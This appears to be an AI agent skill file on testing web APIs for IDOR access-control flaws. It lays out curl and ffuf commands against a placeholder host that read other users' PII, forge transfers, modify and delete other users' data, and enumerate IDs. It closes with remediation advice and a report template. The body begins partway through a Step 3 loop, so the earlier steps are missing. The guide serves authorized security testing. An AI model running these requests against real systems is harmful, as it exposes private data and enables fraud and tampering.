---
name: webapp-access-idor
description: - During authorized penetration tests when testing access control on resource endpoints - When APIs or web pages use predictable identifiers (numeric IDs, UUIDs, slugs) in URLs or request bodies - For validating that object-level authorization is enforced across all CRUD operations - When testing multi-tenant applications where users should only ac
domain: cybersecurity
---
Testing $resource ---"
  # User A's resource
  curl -s -o /dev/null -w "Own: %{http_code} " \
    -H "Authorization: $TOKEN_A" \
    "https://target.example.com/api/v1/users/101/$resource"
  # User B's resource
  curl -s -o /dev/null -w "Other: %{http_code}\n" \
    -H "Authorization: $TOKEN_A" \
    "https://target.example.com/api/v1/users/102/$resource"
done

# Test with POST/PUT/DELETE for write-based IDOR
curl -s -X PUT -H "Authorization: $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"name":"Hacked"}' \
  "https://target.example.com/api/v1/users/102/profile"
```

### Step 4: Test Vertical IDOR (Cross Privilege Level)

Attempt to access admin or elevated resources with a regular user token.

```bash
# As regular user, try accessing admin user profiles
curl -s -H "Authorization: $TOKEN_A" \
  "https://target.example.com/api/v1/users/1/profile" | jq .

# Try accessing admin-specific resources
curl -s -H "Authorization: $TOKEN_A" \
  "https://target.example.com/api/v1/admin/reports/1" | jq .

# Test accessing resources across organizational boundaries
# User in Org A trying to access Org B's resources
curl -s -H "Authorization: $TOKEN_A" \
  "https://target.example.com/api/v1/organizations/2/settings" | jq .

# Test file download IDOR
curl -s -H "Authorization: $TOKEN_A" \
  "https://target.example.com/api/v1/invoices/999/download" -o test.pdf
file test.pdf
```

### Step 5: Test IDOR in Non-Obvious Locations

Look for IDOR in request bodies, headers, and indirect references.

```bash
# IDOR in request body parameters
curl -s -X POST -H "Authorization: $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"sender_id": 101, "recipient_id": 102, "amount": 1}' \
  "https://target.example.com/api/v1/transfers"

# Change sender_id to another user
curl -s -X POST -H "Authorization: $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"sender_id": 102, "recipient_id": 101, "amount": 1000}' \
  "https://target.example.com/api/v1/transfers"

# IDOR in file references
curl -s -H "Authorization: $TOKEN_A" \
  "https://target.example.com/api/v1/files?path=/users/102/documents/secret.pdf"

# IDOR in GraphQL
curl -s -X POST -H "Authorization: $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: 102) { email phone ssn } }"}' \
  "https://target.example.com/graphql"

# IDOR via parameter pollution
curl -s -H "Authorization: $TOKEN_A" \
  "https://target.example.com/api/v1/users/101/profile?user_id=102"

# IDOR in bulk operations
curl -s -X POST -H "Authorization: $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"ids": [101, 102, 103, 104, 105]}' \
  "https://target.example.com/api/v1/users/bulk"
```

### Step 6: Enumerate and Escalate Impact

Determine the full scope of data exposure through IDOR.

```bash
# Enumerate valid object IDs
ffuf -u "https://target.example.com/api/v1/users/FUZZ/profile" \
  -w <(seq 1 500) \
  -H "Authorization: $TOKEN_A" \
  -mc 200 -t 10 -rate 20 \
  -o valid-users.json -of json

# Count total accessible records
jq '.results | length' valid-users.json

# Check what sensitive data is exposed per record
curl -s -H "Authorization: $TOKEN_A" \
  "https://target.example.com/api/v1/users/102/profile" | \
  jq 'keys'
# Look for: email, phone, address, ssn, payment_info, password_hash

# Test IDOR on state-changing operations
# Can User A delete User B's resources?
curl -s -X DELETE -H "Authorization: $TOKEN_A" \
  "https://target.example.com/api/v1/users/102/posts/1" \
  -w "%{http_code}"
# WARNING: Only test DELETE on known test data, never on real user data
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Horizontal IDOR** | Accessing resources belonging to another user at the same privilege level |
| **Vertical IDOR** | Accessing resources requiring higher privileges than the current user has |
| **Direct Object Reference** | Using a database key, file path, or identifier directly in API parameters |
| **Indirect Object Reference** | Using a mapped reference (e.g., index) that the server resolves to the actual object |
| **Object-Level Authorization** | Server-side check that the requesting user is authorized to access the specific object |
| **Predictable IDs** | Sequential numeric identifiers that allow easy enumeration of valid objects |
| **UUID Randomness** | Using UUIDv4 makes enumeration harder but does not replace authorization checks |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | HTTP proxy with Intruder for ID enumeration and Repeater for manual testing |
| **Authorize (Burp Extension)** | Automated IDOR testing by replaying requests with different user sessions |
| **AutoRepeater (Burp Extension)** | Automatically repeats requests with modified authorization headers |
| **Postman** | API testing with environment variables for switching between user contexts |
| **ffuf** | Fast fuzzing of object ID parameters |
| **OWASP ZAP** | Free proxy alternative with access control testing plugins |

## Common Scenarios

### Scenario 1: Invoice Download IDOR
The `/invoices/{id}/download` endpoint generates PDF invoices. By incrementing the invoice ID, any authenticated user can download invoices belonging to other customers, exposing billing addresses and payment details.

### Scenario 2: User Profile Data Leak
The `/api/users/{id}` endpoint returns full user profiles including email, phone, and address. The API only checks if the request has a valid token but never verifies whether the token owner matches the requested user ID.

### Scenario 3: File Access via Path Manipulation
A document management system stores files at `/files/{user_id}/{filename}`. By changing the `user_id` path segment, users can access private documents uploaded by other users.

### Scenario 4: Message Thread Hijacking
A messaging endpoint at `/api/conversations/{id}/messages` allows any authenticated user to read messages in any conversation by changing the conversation ID.

## Output Format

```
## IDOR Vulnerability Finding

**Vulnerability**: Insecure Direct Object Reference (Horizontal IDOR)
**Severity**: High (CVSS 7.5)
**Location**: GET /api/v1/users/{id}/profile
**OWASP Category**: A01:2021 - Broken Access Control

### Reproduction Steps
1. Authenticate as User A (ID: 101) and obtain JWT token
2. Send GET /api/v1/users/101/profile with User A's token (returns own profile)
3. Change the ID to 102: GET /api/v1/users/102/profile with User A's token
4. Observe that User B's full profile is returned including PII

### Affected Endpoints
| Endpoint | Method | Impact |
|----------|--------|--------|
| /api/v1/users/{id}/profile | GET | Read PII of any user |
| /api/v1/users/{id}/orders | GET | Read order history of any user |
| /api/v1/users/{id}/profile | PUT | Modify profile of any user |
| /api/v1/invoices/{id}/download | GET | Download any user's invoices |

### Impact
- 15,000+ user profiles accessible (enumerated IDs 1-15247)
- Exposed fields: name, email, phone, address, date_of_birth
- Write IDOR allows profile modification of other users
- Violates GDPR data access controls

### Recommendation
1. Implement object-level authorization: verify the requesting user owns or has permission to access the requested object
2. Use non-enumerable identifiers (UUIDv4) as a defense-in-depth measure
3. Log and alert on sequential ID enumeration patterns
4. Implement rate limiting on resource endpoints
```